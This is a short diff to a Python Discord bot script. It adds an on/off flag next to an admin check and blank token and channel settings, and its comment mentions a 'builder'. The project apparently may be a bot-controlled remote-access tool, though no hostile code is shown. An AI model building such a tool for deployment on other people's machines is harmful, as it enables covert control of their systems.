@@ -19,6 +19,10 @@ if not IsAdmin():
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
 
+# temp area for needed variables, mategol you should add something to do this automatically in the builder ig :p
+turned_off = False
+# end of area
+
 bot_token = ""
 guild_id = int
 channel_ids = {                                                    
